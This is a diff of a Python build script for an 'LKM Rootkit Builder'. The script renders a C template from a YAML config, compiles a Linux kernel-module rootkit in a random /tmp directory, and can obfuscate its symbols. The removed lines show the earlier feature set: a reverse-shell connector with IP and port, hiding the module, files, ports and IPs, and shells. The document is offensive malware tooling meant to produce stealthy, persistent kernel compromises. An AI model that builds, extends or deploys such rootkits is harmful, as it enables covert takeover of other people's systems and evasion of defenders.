@@ -1,69 +1,67 @@
 #!/usr/bin/env python3
 
 import os
+import sys
 import yaml
+import shutil
 import argparse
 
-from builder_src.template_generator import TemplateGenerator
+from jinja2 import Template
 
-generator = TemplateGenerator()
+from obfuscator import Obfuscator
+
+obfuscated = False
+
+ob = Obfuscator()
 
 parser = argparse.ArgumentParser(description='Generate rootkit from yaml prescription')
-parser.add_argument('--config', type=str, default="config.yml", help='Yaml prescription file')
+parser.add_argument('-c', '--config', type=str, default="config.yml", help='Yaml prescription file')
+parser.add_argument('-o', '--obfuscate', type=str, help='Enable rootkit symbols obfuscation', action='store', const='true', nargs='?')
 args = parser.parse_args()
 
 print("""
- ████   ████████   ████████  ██████████ █████       ███   █████   
-░░███  ███░░░░███ ███░░░░███░███░░░░███░░███       ░░░   ░░███    
- ░███ ░░░    ░███░░░    ░███░░░    ███  ░███ █████ ████  ███████  
- ░███    ██████░    ██████░       ███   ░███░░███ ░░███ ░░░███░   
- ░███   ░░░░░░███  ░░░░░░███     ███    ░██████░   ░███   ░███    
+ ████   ████████   ████████  ██████████ █████       ███   █████
+░░███  ███░░░░███ ███░░░░███░███░░░░███░░███       ░░░   ░░███
+ ░███ ░░░    ░███░░░    ░███░░░    ███  ░███ █████ ████  ███████
+ ░███    ██████░    ██████░       ███   ░███░░███ ░░███ ░░░███░
+ ░███   ░░░░░░███  ░░░░░░███     ███    ░██████░   ░███   ░███
  ░███  ███   ░███ ███   ░███    ███     ░███░░███  ░███   ░███ ███
- █████░░████████ ░░████████    ███      ████ █████ █████  ░░█████ 
-░░░░░  ░░░░░░░░   ░░░░░░░░    ░░░      ░░░░ ░░░░░ ░░░░░    ░░░░░  
+ █████░░████████ ░░████████    ███      ████ █████ █████  ░░█████
+░░░░░  ░░░░░░░░   ░░░░░░░░    ░░░      ░░░░ ░░░░░ ░░░░░    ░░░░░
 LKM Rootkit Builder
 """)
 
 with open(args.config, 'r') as file:
     rootkit = yaml.safe_load(file)
 
-if "connector" in rootkit.keys():
-    ip = "127.0.0.1"
-    port = "1337"
-    if "ip" in rootkit["connector"]:
-        ip = rootkit["connector"]["ip"]
+with open("rootkit_files/rootkit_template.j2", "r") as f:
+    template = f.read()
 
-    if "port" in rootkit["connector"]:
-        port = rootkit["connector"]["port"]
+tm = Template(template)
+msg = tm.render(rootkit)
 
-    generator.connector_generator(ip, port)
+with open("rootkit/main.c", "w") as f:
+    f.write(msg)
 
-if "hideme" in rootkit.keys():
-    generator.hideme(rootkit["hideme"])
+build_directory = ob.random_string()
 
-if "hide_dent" in rootkit.keys():
-    generator.hide_dent(rootkit["hide_dent"])
+original_directory = os.getcwd()
 
-hide_port_hook = False
+os.system("cp -r . /tmp/"+build_directory)
+os.chdir("/tmp/"+build_directory)
+os.system("mv rootkit_files/Makefile .")
 
-if "hide_port" in rootkit.keys():
-    generator.hide_port(rootkit["hide_port"])
-    hide_port_hook = True
-
-if "hide_ip" in rootkit.keys():
-    generator.hide_ip(rootkit["hide_ip"], hide_port_hook)
-
-if "shells" in rootkit.keys():
-    generator.shells(rootkit["shells"])
-
-template = generator.generate()
-
-f = open("rootkit_src/rootkit_example.c", "w")
-f.write(template)
-f.close()
+if args.obfuscate:
+    ob.start()
+    obfuscated = True
 
 os.system("make")
-os.system("mv rootkit.ko generated_rootkit")
-os.system("make clean")
-os.system("mv generated_rootkit rootkit.ko")
-os.remove("rootkit_src/rootkit_example.c")
+
+rootkit_name = "project"
+if obfuscated:
+    rootkit_name = ob.get_name()
+
+os.system("mv /tmp/"+build_directory+"/"+rootkit_name+".ko "+original_directory)
+shutil.rmtree("/tmp/"+build_directory)
+
+print("\n=== File "+original_directory+"/"+rootkit_name+".ko created ===\n")
